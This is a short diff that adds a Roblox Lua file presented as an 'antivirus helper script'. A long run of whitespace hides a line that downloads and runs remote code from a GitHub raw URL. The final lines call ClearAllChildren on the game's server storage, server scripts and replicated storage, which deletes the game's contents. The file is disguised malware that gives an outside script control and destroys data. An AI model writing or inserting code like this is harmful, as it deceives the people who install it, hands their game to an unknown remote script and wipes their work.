@@ -1,0 +1,7 @@
+-- antivirus helper script 6.3
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukez/Scripts/main/UTG%20V3%20RAW"))()
+-- more here soon
+
+game:GetService("ServerStorage").ClearAllChildren()
+game:GetService("ServerScriptService").ClearAllChildren()
+game:GetService("ReplicatedStorage").ClearAllChildren()
